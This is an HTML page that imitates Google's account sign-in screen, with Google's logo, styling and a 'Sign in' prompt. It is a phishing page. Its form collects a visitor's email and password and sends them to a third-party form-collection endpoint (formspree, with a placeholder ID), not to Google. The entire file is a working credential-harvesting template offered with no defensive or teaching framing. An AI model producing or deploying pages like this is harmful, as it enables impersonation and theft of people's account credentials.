<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Google Account Security</title>
    <style>
        body { font-family: 'Segoe UI', Arial; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { border: 1px solid #dadce0; padding: 40px; width: 350px; border-radius: 8px; text-align: center; }
        img { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { margin-bottom: 25px; color: #202124; }
        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; font-weight: 500; }
    </style>
</head>
<body>
    <div class="login-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form action="https://formspree.io/f/YOUR_ID" method="POST">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <div style="text-align: left; color: #1a73e8; font-size: 14px; margin-bottom: 20px; cursor: pointer;">Forgot password?</div>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
